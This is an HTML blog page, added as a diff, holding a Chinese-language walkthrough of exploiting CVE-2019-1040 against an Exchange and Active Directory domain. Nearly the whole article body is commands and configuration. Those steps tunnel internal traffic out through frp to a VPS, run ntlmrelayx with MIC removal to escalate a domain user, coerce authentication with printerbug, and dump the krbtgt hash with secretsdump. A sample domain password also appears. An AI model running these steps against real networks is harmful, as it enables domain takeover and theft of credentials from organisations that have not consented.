@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="准备Exchange攻击路径做演示 公网Windows一台 释放445端口，需要重启一次 sc config Browser start&#x3D; disabledsc stop Browsersc config LanmanServer start&#x3D; disabledsc stop LanmanServer     内网在控Windows一台（用来转发流量），如果是Linux直接上impacket利用就">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2019-1040 在内网没有在控Linux下的利用">
+<meta property="og:url" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="行云">
+<meta property="og:description" content="准备Exchange攻击路径做演示 公网Windows一台 释放445端口，需要重启一次 sc config Browser start&#x3D; disabledsc stop Browsersc config LanmanServer start&#x3D; disabledsc stop LanmanServer     内网在控Windows一台（用来转发流量），如果是Linux直接上impacket利用就">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/23cf9b33-f63c-429b-aaa9-575f14b4c586.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/80237d3c-91f7-4533-94f6-638465b2fff8.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/61f1466d-3fec-4581-9af9-e6be8e67c3b8.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/c34c1f5e-8769-47d7-badf-3de059b166d9.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/9af25f77-80be-490e-a421-7a5712891dc2.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/f90c4021-bcd8-47f8-9069-79e19749460b.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/08e11f06-1cec-44ee-9df8-f8b912e9d433.png">
+<meta property="og:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/e371486b-2a34-4463-9525-7ce9cc55cc42.png">
+<meta property="article:published_time" content="2020-07-15T04:35:54.632Z">
+<meta property="article:modified_time" content="2020-07-15T04:40:02.786Z">
+<meta property="article:author" content="行云">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/23cf9b33-f63c-429b-aaa9-575f14b4c586.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>CVE-2019-1040 在内网没有在控Linux下的利用</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/07/15/index/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&text=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&is_video=false&description=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2019-1040 在内网没有在控Linux下的利用&body=Check out this article: http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&name=CVE-2019-1040 在内网没有在控Linux下的利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&t=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#准备"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击"><span class="toc-number">2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#先把内网流量代理出来"><span class="toc-number">2.0.1.</span> <span class="toc-text">先把内网流量代理出来</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#再通过代理把VPS的445端口转发到内网机器的445端口上面去"><span class="toc-number">2.0.2.</span> <span class="toc-text">再通过代理把VPS的445端口转发到内网机器的445端口上面去</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#攻击-1"><span class="toc-number">2.0.3.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#dumphash"><span class="toc-number">2.0.4.</span> <span class="toc-text">dumphash</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        CVE-2019-1040 在内网没有在控Linux下的利用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">行云</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-07-15T04:35:54.632Z" itemprop="datePublished">2020-07-15</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Bypass/">Bypass</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><pre><code>Exchange攻击路径做演示</code></pre><ul>
+<li>公网<code>Windows</code>一台<ul>
+<li>释放<code>445</code>端口，需要重启一次<blockquote>
+<p>sc config Browser start= disabled<br>sc stop Browser<br>sc config LanmanServer start= disabled<br>sc stop LanmanServer</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>内网在控<code>Windows</code>一台（用来转发流量），如果是<code>Linux</code>直接上<code>impacket</code>利用就好了<ul>
+<li>也需要重启一次释放<code>445</code>端口，同上</li>
+</ul>
+</li>
+<li><code>VPS</code>上安装<code>impacket</code>环境：<code>https://github.com/SecureAuthCorp/impacket</code><ul>
+<li>安装依赖时会爆一个<code>readline</code>无法安装于<code>windows</code>：改为安装<code>pyreadline</code>即可</li>
+</ul>
+</li>
+<li><code>VPS</code>上安装<code>SocksCap</code>：<code>https://www.sockscap64.com/sockscap64-changelog/</code></li>
+<li><code>Frp</code>：<code>https://github.com/fatedier/frp</code></li>
+<li>域用户账号密码一个</li>
+</ul>
+<hr>
+<h4 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h4><h6 id="先把内网流量代理出来"><a href="#先把内网流量代理出来" class="headerlink" title="先把内网流量代理出来"></a>先把内网流量代理出来</h6><ul>
+<li><code>VPS</code>监听：<code>frps.exe -c frps.ini</code><ul>
+<li><code>frps.ini</code>配置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">#绑定地址</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">#TCP绑定端口</span><br><span class="line">bind_port &#x3D; 7000</span><br><span class="line">#连接密码</span><br><span class="line">token &#x3D; Lkjhg</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>内网机器开<code>socks5</code>到<code>VPS:8088</code>：<code>frpc.exe -c frpc.ini</code><ul>
+<li><code>frpc.ini</code>配置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">#VPS地址</span><br><span class="line">server_addr &#x3D; 45.76.189.134</span><br><span class="line">#VPS绑定端口</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">#VPS连接密码</span><br><span class="line">token &#x3D; Lkjhg</span><br><span class="line">#TLS协议加密</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line"></span><br><span class="line">#socks5</span><br><span class="line">[socks5]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 8088</span><br><span class="line">plugin &#x3D; socks5</span><br></pre></td></tr></table></figure>
+<h6 id="再通过代理把VPS的445端口转发到内网机器的445端口上面去"><a href="#再通过代理把VPS的445端口转发到内网机器的445端口上面去" class="headerlink" title="再通过代理把VPS的445端口转发到内网机器的445端口上面去"></a>再通过代理把VPS的445端口转发到内网机器的445端口上面去</h6></li>
+</ul>
+</li>
+<li>配置<code>SocksCap</code>：<ul>
+<li><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/23cf9b33-f63c-429b-aaa9-575f14b4c586.png" alt></li>
+<li><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/80237d3c-91f7-4533-94f6-638465b2fff8.png" alt></li>
+<li><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/61f1466d-3fec-4581-9af9-e6be8e67c3b8.png" alt></li>
+</ul>
+</li>
+<li>然后在内网机器上起一个<code>frps</code>监听：<code>frps.exe -c frps.ini</code><ul>
+<li><code>frps.ini</code>配置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr &#x3D; 0.0.0.0</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><code>VPS</code>上启动刚刚在<code>SocksCap</code>里添加的<code>frpc</code>：<ul>
+<li><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/c34c1f5e-8769-47d7-badf-3de059b166d9.png" alt></li>
+<li><code>frpc.ini</code>配置<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.137.102#这里是内网机器ip</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[smb_proxy]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 45.76.189.134#这里是VPSip</span><br><span class="line">local_port &#x3D; 445</span><br><span class="line">remote_port &#x3D; 445</span><br></pre></td></tr></table></figure>
+<h6 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h6></li>
+</ul>
+</li>
+<li>配置<code>SocksCap</code>：程序选择<code>Python</code>；路径全部选择<code>impacket</code>目录<ul>
+<li><code>ntlmrelayx</code>启动参数：<code>ntlmrelayx.py --escalate-user alex -t ldap://DC.xy.local -smb2support --remove-mic --delegate-access</code><blockquote>
+<p><code>alex</code>：要提升权限的域用户<br><code>DC.xy.local</code>：域控<br><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/9af25f77-80be-490e-a421-7a5712891dc2.png" alt></p>
+</blockquote>
+</li>
+<li><code>printerbug</code>启动参数：<code>printerbug.py xy.local/alex:du-a-123@192.168.137.103 192.168.137.102</code><blockquote>
+<p><code>xy.local</code>：域名<br><code>alex:du-a-123</code>：域用户:密码<br><code>192.168.137.103</code>：<code>Exchange Server</code><br><code>192.168.137.102</code>：回连机器ip，也就是现在控的内网机器<br><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/f90c4021-bcd8-47f8-9069-79e19749460b.png" alt></p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li>先右键<code>ntlmrelayx</code>在代理隧道中运行，成功监听后再右键<code>printerbug</code>在代理隧道中运行</li>
+<li><code>ntlmrelayx</code>打印说用户<code>alex</code>已经获取到权限，让我们尝试使用<code>secretsdump.py</code>脚本去dumphash<br><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/08e11f06-1cec-44ee-9df8-f8b912e9d433.png" alt><h6 id="dumphash"><a href="#dumphash" class="headerlink" title="dumphash"></a>dumphash</h6></li>
+<li><code>secretsdump</code>启动参数为：<code>secretsdump.py xy.local/alex@xy.local -just-dc-user krbtgt -outputfile krbtgt</code><blockquote>
+<p><code>xy.local</code>：域名<br><code>alex@xy.local</code>：用户名@域名<br><code>-just-dc-user krbtgt</code>：只dump<code>krbtgt</code>的hash（也可以直接dump域内所有hash或DC所有hash，具体情况）<br><code>-outputfile krbtgt</code>：导出文件名为<code>krbtgt</code><br><img src="/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/e371486b-2a34-4463-9525-7ce9cc55cc42.png" alt></p>
+</blockquote>
+</li>
+<li>运行后会提示输入密码，就输入<code>alex</code>用户的，运行完会在<code>impacket</code>目录生成3个以<code>krbtgt</code>为名的文件，hash都在里面</li>
+</ul>
+<p>嫌麻烦就直接给内网机器装个<code>Python</code></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#准备"><span class="toc-number">1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#攻击"><span class="toc-number">2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#先把内网流量代理出来"><span class="toc-number">2.0.1.</span> <span class="toc-text">先把内网流量代理出来</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#再通过代理把VPS的445端口转发到内网机器的445端口上面去"><span class="toc-number">2.0.2.</span> <span class="toc-text">再通过代理把VPS的445端口转发到内网机器的445端口上面去</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#攻击-1"><span class="toc-number">2.0.3.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#dumphash"><span class="toc-number">2.0.4.</span> <span class="toc-text">dumphash</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&text=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&is_video=false&description=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CVE-2019-1040 在内网没有在控Linux下的利用&body=Check out this article: http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&title=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&name=CVE-2019-1040 在内网没有在控Linux下的利用&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/07/15/CVE_2019_1040-%E5%9C%A8%E5%86%85%E7%BD%91%E6%B2%A1%E6%9C%89%E5%9C%A8%E6%8E%A7Linux%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8/&t=CVE-2019-1040 在内网没有在控Linux下的利用" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
